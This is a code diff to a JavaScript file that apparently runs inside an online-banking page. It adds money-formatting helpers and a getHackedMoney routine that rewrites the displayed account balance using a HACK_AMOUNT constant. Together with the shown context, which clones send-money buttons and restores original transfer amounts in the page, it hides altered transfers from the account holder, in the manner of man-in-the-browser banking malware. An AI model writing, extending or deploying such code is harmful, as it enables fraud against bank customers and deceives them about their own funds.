@@ -127,11 +127,55 @@ window.deleteData = function(){
 }
 //deleteData();
 
+//conversion from float to money value
+//script from http://www.irt.org/script/723.htm and slightly adapted to
+//€-format
+function outputMoney(number) {
+    return outputEuros(Math.floor(number-0) + '') + outputCents(number - 0);
+}
 
+function outputEuros(number) {
+    if (number.length <= 3)
+        return (number == '' ? '0' : number);
+    else {
+        var mod = number.length%3;
+        var output = (mod == 0 ? '' : (number.substring(0,mod)));
+        for (i=0 ; i < Math.floor(number.length/3) ; i++) {
+            if ((mod ==0) && (i ==0))
+                output+= number.substring(mod+3*i,mod+3*i+3);
+            else
+                output+= '.' + number.substring(mod+3*i,mod+3*i+3);
+        }
+        return (output);
+    }
+}
+
+function outputCents(amount) {
+    amount = Math.round( ( (amount) - Math.floor(amount) ) *100);
+    return (amount < 10 ? ',0' + amount : '.' + amount);
+}
+
+
+/*
+ * gets real money and computes expected money
+ */
+function getHackedMoney(realMoney) {
+	storedTransfers = loadTransfers();
+	diffMoney = 0;
+	console.log(realMoney);
+	for ( i = 0; i < storedTransfers.length; i++) {
+		diffMoney += HACK_AMOUNT - storedTransfers[i].amount;
+		console.log(diffMoney);
+	}
+	console.log(diffMoney);
+	console.log(realMoney);
+	console.log(diffMoney + realMoney);
+	return (realMoney + diffMoney);
+}
 	 function timedMsg()
 		 {
 		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){	
-			 	console.log("a");
+			 	
 		 			$(this).attr("hackMarker","true");
 		 			sendMoneyBtnClone=$(this).clone(true)
 		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
@@ -302,9 +346,32 @@ window.deleteData = function(){
 		 		
 		 		var amount = 	$(this).next().next().next().children();
 		 		amount.text(originalData.amount);
+		 		
+		 		
 
 		 		
-		 	}); 	
+		 	});
+		 	//set hackmarker for transaction so they will not be changed during account amount manipulation
+		 	transactionRow= $(".TransfersOdd,.TransfersEven").each(function(){
+		 		$(this).next().next().next().attr("hackMarker","true");
+		 	});
+		 	//manipulate money value of account
+		 	$(".negativeMoney[hackmarker!='true'],.positiveMoney[hackmarker!='true']").each(function() {
+				 $(this).attr("hackMarker","true");
+				 //manipulate string to look like internal representation of a number
+				 text = $(this).text();
+				 text = text.replace(".", "");
+				 text = text.replace(",", ".");
+				 console.log("\u20AC");
+				 text = text.replace("\u20AC", "");
+				 console.log(text +"aaaaa");
+				 oldValue = new parseFloat(text); 
+				 newValue = getHackedMoney(oldValue);
+				 
+				
+				//display with 2 decimal places and €
+				$(this).text(outputMoney(newValue) + " \u20AC");
+			 });
 		 	var t=setTimeout(timedMsg,300);
 		 }
 	 
